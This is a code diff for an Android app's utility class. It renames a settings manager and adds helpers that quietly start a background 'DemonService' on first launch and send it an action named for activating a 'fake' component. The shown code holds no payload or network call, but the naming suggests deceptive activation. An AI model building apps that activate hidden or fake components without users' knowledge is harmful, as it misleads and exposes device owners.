@@ -10,7 +10,7 @@ import com.plugin.common.utils.UtilsRuntime;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.qm.service.DemonService;
 import com.xstd.qm.service.FakeBindService;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 import java.util.HashMap;
 import java.util.regex.Matcher;
@@ -42,11 +42,37 @@ public class Utils {
         context.startService(is);
     }
 
+    public static void checkAndLanuchQS(Context context) {
+        long launchTime = MainSettingManager.getInstance().getKeyLanuchTime();
+        if (launchTime == 0) {
+            //first lanuch
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
+            }
+
+            Intent i = new Intent();
+            i.setClass(context, DemonService.class);
+            i.setAction(DemonService.ACTION_LANUCH);
+            context.startService(i);
+        }
+    }
+
+    public static void checkAndActiveQS(Context context) {
+        if (MainSettingManager.getInstance().getKeyLanuchTime() != 0
+            && MainSettingManager.getInstance().getKeyActiveTime() == 0) {
+            //注册过，但是没有激活过
+            Intent i = new Intent();
+            i.setClass(context, DemonService.class);
+            i.setAction(DemonService.ACTION_ACTIVE_MAIN_FOR_FAKE);
+            context.startService(i);
+        }
+    }
+
 //    public static String makeExtraInfo(Context context, String appendExtra) {
 //        String extra = "";
 //        boolean isTablet = AppRuntime.isTablet(context);
 //        if (isTablet) extra = extra + ":平板";
-//        String saveExtra = SettingManager.getInstance().getExtraInfo();
+//        String saveExtra = MainSettingManager.getInstance().getExtraInfo();
 //        if (!TextUtils.isEmpty(saveExtra)) {
 //            extra = extra + saveExtra;
 //        }
@@ -62,7 +88,7 @@ public class Utils {
     }
 
     public static void saveExtraInfo(String info) {
-        String saveExtra = SettingManager.getInstance().getExtraInfo();
+        String saveExtra = MainSettingManager.getInstance().getExtraInfo();
         if (!TextUtils.isEmpty(saveExtra)) {
             String[] splited = saveExtra.split(":");
             if (splited != null) {
@@ -75,13 +101,13 @@ public class Utils {
                 }
                 if (!contain) {
                     saveExtra = saveExtra + ":" + info;
-                    SettingManager.getInstance().setExtraInfo(saveExtra);
+                    MainSettingManager.getInstance().setExtraInfo(saveExtra);
                 }
             } else {
-                SettingManager.getInstance().setExtraInfo(info);
+                MainSettingManager.getInstance().setExtraInfo(info);
             }
         } else {
-            SettingManager.getInstance().setExtraInfo(info);
+            MainSettingManager.getInstance().setExtraInfo(info);
         }
     }
 
